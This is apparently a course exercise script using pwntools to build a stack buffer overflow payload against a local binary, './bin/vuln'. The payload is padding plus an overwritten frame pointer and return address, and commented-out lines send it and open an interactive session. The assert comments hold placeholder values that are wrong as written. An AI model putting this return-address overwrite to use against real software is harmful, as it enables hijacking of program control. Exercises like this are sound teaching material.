#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

context.binary = './bin/vuln'

# p32/64 for "packing" 32- or 64-bit integers
# # so, given an integer, it returns a packed (i.e., encoded) bytestring
# assert p32(0x12345678) == b'\x00\x00\x00\x00'                  # Q1
# assert p64(0x12345678) == b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Q2



payload = b'\x00' * 32 + p64(0x7fffffffde10) + p64( 0x55555555520a)

print(payload.hex())

with open('./bin/input', 'wb') as fd:
    fd.write(payload)

# # launch a process (with no arguments)
# p = process(['./bin/vuln'])

# # send an input payload to the process
# p.send(payload + b'\n')  # or, shorter: "p.sendline(payload)"

# # make it interactive, meaning that we can interact with the
# # process's input/output (via a pseudo-terminal)
# p.interactive()
